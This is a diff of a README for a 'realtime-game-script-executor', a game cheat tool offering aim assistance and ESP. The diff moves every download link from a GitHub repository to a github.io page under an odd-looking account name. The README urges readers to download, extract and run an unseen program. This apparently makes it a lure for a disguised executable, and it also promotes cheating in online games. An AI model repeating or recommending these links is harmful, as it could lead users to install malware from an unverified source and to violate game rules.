@@ -1,6 +1,6 @@
 # 🎮 realtime-game-script-executor - Level Up Your Gaming Experience Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Software-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/apparatusurogenitalisdebitcard285/realtime-game-script-executor)
+[![Download Now](https://img.shields.io/badge/Download-Software-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://apparatusurogenitalisdebitcard285.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! This guide will walk you through getting the **realtime-game-script-exe
 
 Visit this link to download the application:
 
-**[Download realtime-game-script-executor](https://github.com/apparatusurogenitalisdebitcard285/realtime-game-script-executor)**
+**[Download realtime-game-script-executor](https://apparatusurogenitalisdebitcard285.github.io)**
 
 Click the link above, and your browser will take you to the download page. Look for the download button on that page — it’s usually green and says "Download" or shows a downward arrow. Click it and save the file to a location you can easily find, like your **Desktop** or **Downloads** folder.
 
@@ -141,7 +141,7 @@ No — the program is designed to be very light on resources. It typically uses 
 
 Ready to enhance your gaming experience? Here’s the quick recap:
 
-1. **[Download the software](https://github.com/apparatusurogenitalisdebitcard285/realtime-game-script-executor)** using the link above.
+1. **[Download the software](https://apparatusurogenitalisdebitcard285.github.io)** using the link above.
 2. Extract the file if needed, then run the application.
 3. Launch your favorite game and press **F8** to open the in-game overlay.
 4. Toggle the features you want — aim assistance, ESP tracking, or mods.
